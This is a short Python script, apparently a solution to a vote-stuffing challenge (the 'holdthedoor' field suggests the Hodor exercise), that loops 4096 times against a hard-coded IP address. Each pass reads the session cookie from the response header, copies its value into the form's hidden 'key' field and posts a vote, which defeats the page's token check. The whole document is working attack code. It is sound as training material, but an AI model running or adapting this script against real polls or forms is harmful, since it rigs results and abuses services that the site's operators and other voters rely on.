#!/usr/bin/python3
import requests

URL = "http://158.69.76.135/level1.php"
s = requests.Session()

payload = {"id": "1324", 'holdthedoor': 'submit', "key":""}
for i in range(0, 4096):
    r = s.get('http://158.69.76.135/level1.php')
    fde=r.headers['set-cookie']
    print(r.headers)
    inp=r.headers['set-cookie'].index("=")
    ind=r.headers['set-cookie'].index(";")
    payload["key"] = fde[(inp + 1):ind]
    r = s.post(URL, data=payload)
    if r.status_code == 200:
        print("vote nb {}".format(i))
    else:
        print("faile nb {}".format(i))
